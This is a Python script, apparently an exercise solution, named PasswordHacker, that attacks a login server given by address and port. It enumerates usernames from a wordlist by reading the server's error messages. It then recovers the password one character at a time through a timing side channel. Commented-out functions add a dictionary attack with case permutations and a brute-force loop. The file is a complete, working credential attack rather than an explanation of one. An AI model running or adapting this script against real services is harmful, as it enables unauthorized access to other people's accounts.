import json
import socket
import sys
import string
from itertools import product
from time import perf_counter


def combinations_of_upper_and_lower_case(word):
    if word.isdigit():
        yield word
        return

    for i in range(2 ** len(word)):
        combination = ""

        for j in range(len(word)):
            if (i >> j) & 1:
                combination += word[j].upper()
            else:
                combination += word[j].lower()

        yield combination


class PasswordHacker:
    SUCCESS_MESSAGE = "Connection success!"
    BUFFER_SIZE = 1024

    def __init__(self):
        if len(sys.argv) != 3:
            print("Usage: python script.py <IPv4_address> <port_number>")
            sys.exit(1)

        self.address = (sys.argv[1], int(sys.argv[2]))

    def create_connection(self):
        try:
            with socket.socket() as self.my_socket:
                self.my_socket.connect(self.address)
                login = self.guess_login()
                password = self.guess_password(login)
                my_dict = {"login": login, "password": password}
                json_msg = json.dumps(my_dict, indent=4)
                print(json_msg)

        except ConnectionRefusedError:
            print("Error: Connection refused")
        except Exception as e:
            print(f"Error: {e}")

    def guess_login(self):
        with open("logins.txt", 'r') as file:
            login_list = file.read().splitlines()

            for login in login_list:
                my_dict = {"login": login, "password": "silly_password"}
                json_request_msg = json.dumps(my_dict, indent=4)

                self.my_socket.sendall(json_request_msg.encode())
                response = self.my_socket.recv(self.BUFFER_SIZE).decode()
                response = json.loads(response)

                if response["result"] == "Wrong password!":
                    return login

        return "No login found!"

    def guess_password(self, login):
        chars = string.ascii_letters + string.digits
        password = ""

        while True:
            time_dict = {}
            for char in chars:
                my_dict = {"login": login, "password": password + char}
                json_request_msg = json.dumps(my_dict, indent=4)

                start = perf_counter()
                self.my_socket.sendall(json_request_msg.encode())
                response = self.my_socket.recv(self.BUFFER_SIZE).decode()
                response = json.loads(response)
                end = perf_counter()

                elapsed = end - start
                time_dict[char] = elapsed

                if response["result"] == "Connection success!":
                    password += char
                    return password

            max_time_letter = max(time_dict, key=time_dict.get)
            password += max_time_letter

    """ Function could be used for guessing common passwords according to statistics
    def guess_typical_password(self):
        with open("passwords.txt", 'r') as file:
            passwords_list = file.read().splitlines()
            for password in passwords_list:
                word_combinations = combinations_of_upper_and_lower_case(password)
                for combination in word_combinations:
                    self.my_socket.sendall(''.join(combination).encode())
                    response = self.my_socket.recv(self.BUFFER_SIZE).decode()
                    if response == self.SUCCESS_MESSAGE:
                        return combination
    """

    """ Function for guessing simple passwords with only small letters
    def guess_random_password(self):
        chars = string.ascii_lowercase + string.digits
        i = 1
        while True:
            for password in itertools.product(chars, repeat=i):
                self.my_socket.sendall(''.join(password).encode())
                response = self.my_socket.recv(self.BUFFER_SIZE).decode()
                if response == self.SUCCESS_MESSAGE:
                    return ''.join(password)
            i += 1
    """


new_connection = PasswordHacker()
new_connection.create_connection()
